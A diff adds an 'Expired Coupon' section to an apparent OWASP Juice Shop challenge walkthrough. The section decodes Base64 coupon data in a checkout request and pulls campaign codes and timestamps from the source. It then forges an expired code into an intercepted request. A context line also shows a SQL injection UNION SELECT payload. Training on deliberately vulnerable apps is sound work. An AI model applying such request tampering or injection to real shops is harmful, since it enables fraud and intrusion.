@@ -57,6 +57,63 @@ xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '
 
 The role must be the `accounting`!
 
+## Expired Coupon (Improper Input Validation)
+_Successfully redeem an expired campaign coupon code._
+
+The first step is to take a look how coupons work. You can always get a valid coupon on
+[Juice shop Twitter](https://twitter.com/owasp_juiceshop).
+
+There's a [coupon for 09/2020](https://twitter.com/owasp_juiceshop/status/1301392070532308992):
+```
+q:<IrfFb4l
+```
+
+Log in, add some items into the basket and make an order using the coupon. The important request is:
+```
+POST /rest/basket/1/checkout
+
+{"couponData":"cTo8SXJmRmI0bC0xNjAxMTYxMjAwMDAw","orderDetails":{"paymentId":"4","addressId":"3","deliveryMethodId":"1"}}
+```
+
+Decode `couponData` (Base64):
+```
+q:<IrfFb4l-1601161200000
+```
+
+There's the coupon code (`q:<IrfFb4l`), and today's timestamp (`1601161200000`).
+
+Now let's look for some expired coupons.
+ 
+At first, I was looking for an older coupon on Twitter but that does not work!
+The challenge description states: "redeem an expired **campaign** coupon code".
+
+Searching for `campaign` in source code points to:
+```
+WMNSDY2019: {
+    validOn: 15519996e5,
+    discount: 75
+},
+WMNSDY2020: {validOn: 1583622e6, discount: 60},
+WMNSDY2021: {validOn: 1615158e6, discount: 60},
+WMNSDY2022: {validOn: 1646694e6, discount: 60},
+WMNSDY2023: {validOn: 167823e7, discount: 60},
+ORANGE2020: {validOn: 15885468e5, discount: 50},
+ORANGE2021: {validOn: 16200828e5, discount: 40},
+ORANGE2022: {validOn: 16516188e5, discount: 40},
+ORANGE2023: {validOn: 16831548e5, discount: 40}
+```
+
+There's `WMNSDY2019` with valid on `15519996e5` --> `1551999600000` -> `Thursday 7. March 2019 23:00:00`.
+
+Ok, let's try to use it in `couponData`. Encode `WMNSDY2019-1551999600000` with Base64:
+```
+V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw
+```
+
+Intercept the checkout request and modify the coupon data with `V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw`.
+
+Bingo, the discount is yours!
+
 ## Forgotten Developer Backup (Sensitive Data Exposure)
 _Access a developer's forgotten backup file._
 
